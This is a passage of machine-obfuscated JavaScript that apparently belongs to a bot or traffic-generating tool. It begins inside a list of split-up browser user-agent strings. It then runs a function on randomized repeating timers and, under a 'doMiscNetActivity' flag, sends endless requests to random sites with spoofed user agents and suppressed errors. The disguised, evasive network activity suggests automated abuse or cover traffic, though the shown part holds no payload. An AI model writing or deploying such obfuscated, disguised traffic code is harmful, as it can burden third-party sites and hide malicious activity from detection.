      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0x14b + -0x6d4 + -0x63 * -0x15; k < -0x3 * -0x342 + 0x56e * 0x3 + -0x1a0c * 0x1; k++)
    setTimeout(f, (-0x1d08b + 0x1e49 * 0x6 + 0x20535) * k * getRandomInt(-0x8c1 + 0x242f * 0x1 + -0x1 * 0x1b6d, 0xa11 + 0x219c + -0x2baa));
  setInterval(() => {
    f();
    for (let l = -0x1467 + 0x1 * -0xaef + -0x3 * -0xa72; l < -0x4 * -0x73d + 0x83 * 0x23 + -0x43 * 0xb3; l++)
      setTimeout(f, (0x1 * 0xdf13 + 0x141d8 + -0x1368b) * l * getRandomInt(0x130 + -0x4 * -0x12d + -0x5e3, -0x146c + 0x1 * -0x3be + -0x1 * -0x182d));
  }, 0x33836 + -0x436ea * 0x7 + -0x144dac * -0x4);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x47 * 0xf + 0xea6 + -0x17 * -0x5f) * getRandomInt(0x244 * 0x4 + -0x1e17 + 0x1508, -0x4ee * 0x1 + 0x1 * 0xe35 + 0x4a1 * -0x2));
}, 0xab5 * -0x1 + -0x1 * 0x85d + 0x1376);